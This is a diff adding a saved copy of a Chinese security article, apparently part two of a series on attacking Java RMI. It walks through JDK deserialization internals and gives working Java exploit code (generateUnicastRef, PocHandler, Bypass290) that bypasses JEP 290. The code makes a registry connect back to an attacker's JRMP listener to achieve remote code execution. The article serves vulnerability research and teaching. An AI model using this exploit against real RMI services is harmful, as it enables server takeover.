+        <span class="kt">boolean</span> <span class="n">isResultStream</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readBoolean</span><span class="o">();</span>
+        <span class="c1">//恢复一个LiveRef对象(可以理解为一个连接对象)</span>
+        <span class="c1">//此处可以由我们的序列化对象进行指定。</span>
+        <span class="n">LiveRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LiveRef</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">ep</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+        <span class="c1">//判断输入流in是不是已经是一个对象流了，这里都会为true</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">in</span> <span class="k">instanceof</span> <span class="n">ConnectionInputStream</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">ConnectionInputStream</span> <span class="n">stream</span> <span class="o">=</span> <span class="o">(</span><span class="n">ConnectionInputStream</span><span class="o">)</span><span class="n">in</span><span class="o">;</span>
+            <span class="c1">// 保存ref以在所有参数/返回都被解析后再发送"dirty"调用。</span>
+            <span class="n">stream</span><span class="o">.</span><span class="na">saveRef</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">isResultStream</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">stream</span><span class="o">.</span><span class="na">setAckNeeded</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="c1">//-----这里会产生一个误区，实际上我们进入的不是这个registerRefs----</span>
+            <span class="n">DGCClient</span><span class="o">.</span><span class="na">registerRefs</span><span class="o">(</span><span class="n">ep</span><span class="o">,</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="k">new</span> <span class="n">LiveRef</span><span class="o">[]</span> <span class="o">{</span> <span class="n">ref</span> <span class="o">}));</span>
+        <span class="o">}</span>
+
+        <span class="k">return</span> <span class="n">ref</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>我们会进入<code>stream.saveRef(ref);</code>中，将ref填入流中的<code>incomingRefTable</code>字段，再之后统一解析。</p>
+<p><a id="img6" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151149-a4489486-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151149-a4489486-b457-1.png"></a></p>
+<p>然后readobject就执行完了，进入第二步 <strong>releaseInputStream 触发</strong></p>
+<p><a id="img7" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151200-aa4fdc2c-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151200-aa4fdc2c-b457-1.png"></a></p>
+<p><code>sun.rmi.transport.StreamRemoteCall#releaseInputStream</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">releaseInputStream</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">in</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//...省略</span>
+                <span class="c1">//进入此处，统一处理去DGC注册之前readobject解析出来的ref</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">in</span><span class="o">.</span><span class="na">registerRefs</span><span class="o">();</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">in</span><span class="o">.</span><span class="na">done</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">conn</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">conn</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">in</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p><code>sun.rmi.transport.ConnectionInputStream#registerRefs</code>:从之前readobject语句解析出来的<code>incomingRefTable</code>中读取ref。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">registerRefs</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">incomingRefTable</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+        <span class="c1">//遍历incomingRefTable</span>
+        <span class="n">Iterator</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">incomingRefTable</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+        <span class="k">while</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">Entry</span> <span class="n">var2</span> <span class="o">=</span> <span class="o">(</span><span class="n">Entry</span><span class="o">)</span><span class="n">var1</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+            <span class="c1">//开始一个个去DGC注册</span>
+            <span class="n">DGCClient</span><span class="o">.</span><span class="na">registerRefs</span><span class="o">((</span><span class="n">Endpoint</span><span class="o">)</span><span class="n">var2</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="o">(</span><span class="n">List</span><span class="o">)</span><span class="n">var2</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>然后就回到了yso里面的调用栈的下半部分：<code>sun.rmi.transport.DGCClient#registerRefs</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">static</span> <span class="kt">void</span> <span class="nf">registerRefs</span><span class="o">(</span><span class="n">Endpoint</span> <span class="n">ep</span><span class="o">,</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">LiveRef</span><span class="o">&gt;</span> <span class="n">refs</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">EndpointEntry</span> <span class="n">epEntry</span><span class="o">;</span>
+        <span class="k">do</span> <span class="o">{</span>
+            <span class="c1">//从给定的ep中查找引用对象入口</span>
+            <span class="c1">//这里就是我们调用栈下面一直跑的部分。</span>
+            <span class="n">epEntry</span> <span class="o">=</span> <span class="n">EndpointEntry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">ep</span><span class="o">);</span>
+            <span class="c1">//去该入口注册引用对象，如果不成功循环注册，直到成功。</span>
+        <span class="o">}</span> <span class="k">while</span> <span class="o">(!</span><span class="n">epEntry</span><span class="o">.</span><span class="na">registerRefs</span><span class="o">(</span><span class="n">refs</span><span class="o">));</span><span class="c1">//----进入此处---</span>
+    <span class="o">}</span>
+</pre></div>
+<p><code>sun.rmi.transport.DGCClient.EndpointEntry#registerRefs</code>:</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">registerRefs</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">LiveRef</span><span class="o">&gt;</span> <span class="n">refs</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">assert</span> <span class="o">!</span><span class="n">Thread</span><span class="o">.</span><span class="na">holdsLock</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+
+            <span class="n">Set</span><span class="o">&lt;</span><span class="n">RefEntry</span><span class="o">&gt;</span> <span class="n">refsToDirty</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>     <span class="c1">// entries for refs needing dirty</span>
+            <span class="kt">long</span> <span class="n">sequenceNum</span><span class="o">;</span>           <span class="c1">// sequence number for dirty call</span>
+            <span class="c1">//阻塞执行，去遍历查询LiveRef实例</span>
+            <span class="kd">synchronized</span> <span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//省略此处代码，就是做遍历查询的事情</span>
+            <span class="o">}</span>
+            <span class="c1">//为所有结果参与DGC垃圾回收机制注册</span>
+            <span class="c1">//------进入此处------</span>
+            <span class="n">makeDirtyCall</span><span class="o">(</span><span class="n">refsToDirty</span><span class="o">,</span> <span class="n">sequenceNum</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="o">}</span>
+</pre></div>
+<p><code>sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall</code>:(这里会发出DGC客户端的dirty请求)</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">makeDirtyCall</span><span class="o">(</span><span class="n">Set</span><span class="o">&lt;</span><span class="n">RefEntry</span><span class="o">&gt;</span> <span class="n">refEntries</span><span class="o">,</span> <span class="kt">long</span> <span class="n">sequenceNum</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">assert</span> <span class="o">!</span><span class="n">Thread</span><span class="o">.</span><span class="na">holdsLock</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+            <span class="c1">//根据refEntries得到注册用的ids</span>
+            <span class="n">ObjID</span><span class="o">[]</span> <span class="n">ids</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">refEntries</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">ids</span> <span class="o">=</span> <span class="n">createObjIDArray</span><span class="o">(</span><span class="n">refEntries</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">ids</span> <span class="o">=</span> <span class="n">emptyObjIDArray</span><span class="o">;</span>
+            <span class="o">}</span>
+
+            <span class="kt">long</span> <span class="n">startTime</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">//进入此处，进行dirty请求</span>
+                <span class="n">Lease</span> <span class="n">lease</span> <span class="o">=</span>
+                    <span class="n">dgc</span><span class="o">.</span><span class="na">dirty</span><span class="o">(</span><span class="n">ids</span><span class="o">,</span> <span class="n">sequenceNum</span><span class="o">,</span> <span class="k">new</span> <span class="n">Lease</span><span class="o">(</span><span class="n">vmid</span><span class="o">,</span> <span class="n">leaseValue</span><span class="o">));</span>
+</pre></div>
+<p>由于这里是一个接口，静态分析的话，我们需要使用ctrl+alt+B，进入<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Lease</span> <span class="nf">dirty</span><span class="o">(</span><span class="n">ObjID</span><span class="o">[]</span> <span class="n">var1</span><span class="o">,</span> <span class="kt">long</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Lease</span> <span class="n">var4</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">RemoteCall</span> <span class="n">var5</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">operations</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">669196253586618813L</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">ObjectOutput</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeLong</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var20</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling arguments"</span><span class="o">,</span> <span class="n">var20</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="c1">//JRMP服务端打JRMP客户端的反序列化触发点在这里面</span>
+            <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var5</span><span class="o">);</span>
+</pre></div>
+<p>这里就很熟悉了，JRMP服务端打JRMP客户端，JRMP客户端的漏洞触发点就在这。</p>
+<p>那么也就是说<strong>UnicastRef对象的readExternal方法作为反序列化入口的话</strong>，我们可以通过控制序列化的内容使服务器向我们指定的服务器发起JRMP连接（通过DGC层的dirty方法发起），再通过之前讲到的JRMP客户端报错信息反序列化点完成RCE。</p>
+<p>我们把之前的攻击过程调试一下看下，同样在CC链的最后命令执行处下断点：</p>
+<p><a id="img8" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151240-c235043e-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151240-c235043e-b457-1.png"></a></p>
+<p>调用栈,应该是由于服务端线程处理的特性（？）发生了变化，但是最后核心部分是没问题的。（UnicastRef的readExternal处作为入口下断点也是可以看到的，但是之后会跑偏，最后再到这部分）</p>
+<blockquote><p>本地实验发现一个有趣的地方，这里会不断循环，一直请求我们恶意JRMP-Listener，从而不断完成远程代码执行的情况。原因应该是因为分析代码的时候的while循环导致的（这就是我们反序列化触发栈发生变动的原因。），非常有趣，仿佛一个天然发心跳包的木马一样。</p>
+</blockquote>
+<p>知道服务端反序列化处的触发流程之后，我们来看payload的构造。</p>
+<p>一个基础的可以指定连接目标的UnicastRef对象：</p>
+<div class="highlight"><pre><span></span><span class="c1">//让受害者主动去连接的攻击者的JRMPlister的host和port</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="n">UnicastRef</span> <span class="nf">generateUnicastRef</span><span class="o">(</span><span class="n">String</span> <span class="n">host</span><span class="o">,</span> <span class="kt">int</span> <span class="n">port</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">ObjID</span> <span class="n">objId</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">ObjID</span><span class="o">();</span>
+    <span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">transport</span><span class="o">.</span><span class="na">tcp</span><span class="o">.</span><span class="na">TCPEndpoint</span> <span class="n">endpoint</span> <span class="o">=</span> <span class="k">new</span> <span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">transport</span><span class="o">.</span><span class="na">tcp</span><span class="o">.</span><span class="na">TCPEndpoint</span><span class="o">(</span><span class="n">host</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+    <span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">transport</span><span class="o">.</span><span class="na">LiveRef</span> <span class="n">liveRef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">transport</span><span class="o">.</span><span class="na">LiveRef</span><span class="o">(</span><span class="n">objId</span><span class="o">,</span> <span class="n">endpoint</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">UnicastRef</span><span class="o">(</span><span class="n">liveRef</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></div>
+<p>如果这个对象在目标服务器反序列化成功了，就可以顺着之前分析的反序列化过程向外发起连接。<strong>但是如何让这个对象反序列化呢？</strong>还需要进一步的封装。</p>
+<h4>与bind操作进行拼接</h4>
+<p>我们的目标是：将UnicastRef对象封装进入<code>register.bind(String,Remote)</code>的Remote参数中，从而在反序列化Remote参数的时候因为反序列化的递归的特性，进行UnicastRef对象的反序列化。那又回归到了前面讨论过的问题，如何将UnicastRef对象封装成Remote类型：</p>
+<ol>
+<li><p>压根不封装，跟Barmie工具一样自实现通讯协议，直接发送UnicastRef（因为其实只有客户端上层函数需要remote类型的输入，服务端并没有要求是remote类型，都会反序列化）</p>
+</li>
+<li><p>跟RMIRegisterExploit一样，使用<strong>动态代理</strong>来实现封装</p>
+<p>回一下动态代理封装的原理：将我们的payload放在拦截器的类参数中，然后封装拦截器成Remote类型，反序列化的时候就会反序列化拦截器里面的payload的参数，从而形成反序列化。</p>
+<p>但是跟之前不同的是：没有白名单的时候我们可以用到AnnotationInvocationHandler装载UnicastRef对象，再把它动态代理变成Remote对象。</p>
+<p>但是在JEP290之后有了白名单限制，AnnotationInvocationHandler对象被禁了。</p>
+<p>我们需要用到</p>
+</li>
+<li><p>找一个同时继承实现两者的类或者一个实现Remote，并将UnicastRef类型作为其一个字段的类。这样只需要把我们的UnicastRef对象塞入这个类中，然后直接塞进<code>register.bind(String,Remote)</code>中就可以了。</p>
+</li>
+</ol>
+<h5>1.绕过客户端-自实现协议</h5>
+<p>第一类实现bind底层协议，太过底层，感觉可以根据Barmie改，但是有点磕不动，放放。</p>
+<blockquote><p>但是在最后我们还是以两种方式自实现了lookup的协议。</p>
+</blockquote>
+<h5>2.动态代理-自定义</h5>
+<p>代码参考github-Bypass290_proxy.java</p>
+<p>我们自定义一个PocHandler拦截器：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">PocHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">RemoteRef</span> <span class="n">ref</span><span class="o">;</span><span class="c1">//来放我们的UnicastRef对象</span>
+
+    <span class="kd">protected</span> <span class="nf">PocHandler</span><span class="o">(</span><span class="n">RemoteRef</span> <span class="n">newref</span><span class="o">)</span> <span class="o">{</span><span class="c1">//构造方法，来引入UnicastRef</span>
+        <span class="n">ref</span> <span class="o">=</span> <span class="n">newref</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">ref</span> <span class="c1">//只是为了满足拦截类的格式，随便写</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>把生成UnicastRef放入PocHandler拦截器，然后转变为Remote类型。</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">String</span> <span class="n">jrmpListenerHost</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span><span class="o">;</span>
+        <span class="kt">int</span> <span class="n">jrmpListenerPort</span> <span class="o">=</span> <span class="mi">1199</span><span class="o">;</span>
+        <span class="n">UnicastRef</span> <span class="n">unicastRef</span> <span class="o">=</span> <span class="n">generateUnicastRef</span><span class="o">(</span><span class="n">jrmpListenerHost</span><span class="o">,</span> <span class="n">jrmpListenerPort</span><span class="o">);</span>
+        <span class="n">Remote</span> <span class="n">remote</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">RemoteRef</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]{</span><span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">PocHandler</span><span class="o">(</span><span class="n">unicastRef</span><span class="o">));</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span><span class="c1">//本地测试</span>
+        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"2333"</span><span class="o">,</span> <span class="n">remote</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>老样子JRMP-listener一开，然后打ServerAndRegister</p>
+<p><a id="img9" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151306-d1ac22da-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151306-d1ac22da-b457-1.png"></a></p>
+<p>完美，没问题</p>
+<blockquote><p>同时这里存在一个非常神奇的问题，本以为客户端自定义一个PocHandler拦截器，rmi服务端是不会有这个拦截器的，所以在反序列化的时候会因为没有类而报错。但是实际上远程利用是可以成功的。</p>
+<p>从报错中我们也可以看到，服务端确实找不到这个类，但是会触发代码执行，之前bind绑定也说过这个问题，推测由于先反序列化类中的变量，然后恢复成类导致的。</p>
+</blockquote>
+<h5>2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</h5>
+<blockquote><p>这其实就是Ysoserial-Payload-JRMPClient模块生成的payload的实现逻辑</p>
+</blockquote>
+<p>假如不自定义一个拦截器，去jdk环境中寻找也是可以找到的——<strong>RemoteObjectInvocationHandler</strong></p>
+<ol>
+<li>它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
+<li>同时是一个 拦截器。（这表示我们可以通过动态代理把他改成任意的接口）</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">RemoteObjectInvocationHandler</span>
+    <span class="kd">extends</span> <span class="n">RemoteObject</span>
+    <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="c1">//表示是一个拦截器</span>
+<span class="o">{</span>
+
+
+<span class="c1">//构造函数，传入一个RemoteRef接口类型的变量</span>
+    <span class="kd">public</span> <span class="nf">RemoteObjectInvocationHandler</span><span class="o">(</span><span class="n">RemoteRef</span> <span class="n">ref</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">ref</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">NullPointerException</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="c1">//而UnicastRef类型实现RemoteRef接口，即可以传入</span>
+<span class="c1">//public class UnicastRef implements RemoteRef {</span>
+</pre></div>
+<p><code>super(ref);</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">RemoteObject</span> <span class="kd">implements</span> <span class="n">Remote</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">Serializable</span> <span class="o">{</span>
+
+    <span class="cm">/** The object's remote reference. */</span>
+    <span class="kd">transient</span> <span class="kd">protected</span> <span class="n">RemoteRef</span> <span class="n">ref</span><span class="o">;</span>
+
+ <span class="c1">//super(ref)的内容，可以成功塞入变量中</span>
+     <span class="kd">protected</span> <span class="nf">RemoteObject</span><span class="o">(</span><span class="n">RemoteRef</span> <span class="n">newref</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ref</span> <span class="o">=</span> <span class="n">newref</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>然而这里会有一个神奇的问题，我们知道<code>transient</code>修饰的变量在正常的序列化过程中是不会被序列化的（会为空）。那我们特制的ref不就因为无论怎么样都不序列化了？</p>
+<p>但理论的确如此，但实际不是的，因为我们还知道如果这个类对于writeobject、readobject进行了重写，就会进入这个方法进行特殊的逻辑执行。</p>
+<p><code>java.rmi.server.RemoteObject#writeObject</code></p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectOutputStream</span> <span class="n">out</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassNotFoundException</span>
+    <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">ref</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">MarshalException</span><span class="o">(</span><span class="s">"Invalid remote object"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">refClassName</span> <span class="o">=</span> <span class="n">ref</span><span class="o">.</span><span class="na">getRefClass</span><span class="o">(</span><span class="n">out</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">refClassName</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">refClassName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//不会进入的地方....</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="cm">/*</span>
+<span class="cm">                 * Built-in reference class specified, so delegate</span>
+<span class="cm">                 * to reference to write out its external form.</span>
+<span class="cm">                 */</span>
+                 <span class="c1">//我们的序列化操作会进入到这里对于ref进行序列化</span>
+                <span class="n">out</span><span class="o">.</span><span class="na">writeUTF</span><span class="o">(</span><span class="n">refClassName</span><span class="o">);</span>
+                <span class="n">ref</span><span class="o">.</span><span class="na">writeExternal</span><span class="o">(</span><span class="n">out</span><span class="o">);</span>
+                <span class="c1">//在这里通过writeExternal来写入了ref</span>
+                <span class="c1">//（transient类型的变量可以通过writeExternal来写入序列化）</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>在Remoteobject的writeobject方法中可以完成对于同时，我们也可以通过把序列化结果写入文件看序列化结果来证明ref的序列化不会受到影响。</p>
+<p>那么在确定<strong>RemoteObjectInvocationHandler</strong>可以填入一个<strong>UnicastRef对象</strong>并且不影响序列化之后。接下来就是利用动态代理进行类型转变</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Bypass290</span> <span class="o">{</span>
+    <span class="c1">//省略generateUnicastRef方法</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="c1">//获取UnicastRef对象</span>
+        <span class="n">String</span> <span class="n">jrmpListenerHost</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span><span class="o">;</span><span class="c1">//本地测试</span>
+        <span class="kt">int</span> <span class="n">jrmpListenerPort</span> <span class="o">=</span> <span class="mi">1199</span><span class="o">;</span>
+        <span class="n">UnicastRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">generateUnicastRef</span><span class="o">(</span><span class="n">jrmpListenerHost</span><span class="o">,</span> <span class="n">jrmpListenerPort</span><span class="o">);</span>
+        <span class="c1">//通过构造函数封装进入RemoteObjectInvocationHandler</span>
+        <span class="n">RemoteObjectInvocationHandler</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteObjectInvocationHandler</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+        <span class="c1">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span>
+        <span class="c1">//所以接下来bind可以填入proxy</span>
+        <span class="n">Registry</span> <span class="n">proxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Registry</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">Bypass290</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span>
+                                                           <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Registry</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">obj</span><span class="o">);</span>
+        <span class="c1">//触发漏洞</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span><span class="c1">//本地测试</span>
+        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"hello"</span><span class="o">,</span> <span class="n">proxy</span><span class="o">);</span><span class="c1">//填入payload</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
